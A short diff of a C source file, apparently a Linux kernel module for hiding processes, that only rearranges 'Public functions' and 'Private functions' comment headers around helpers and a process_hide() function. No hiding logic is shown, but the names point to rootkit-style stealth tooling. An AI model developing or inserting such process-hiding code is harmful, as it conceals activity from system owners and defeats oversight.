@@ -29,7 +29,7 @@
 #define IS_PROC_HIDDEN(p_task)      ((p_task->flags & INVISIBLE_BIT) == 0)
 
 /******************************************************************************
- *  Public functions.
+ *  Private functions.
  ******************************************************************************/
 
 static struct pid* find_pid(pid_t nr)
@@ -70,6 +70,10 @@ static struct task_struct* find_process(pid_t pid)
     rcu_read_unlock();
     return p_task;
 }
+
+/******************************************************************************
+ *  Public functions.
+ ******************************************************************************/
 
 long process_hide(pid_t pid)
 {
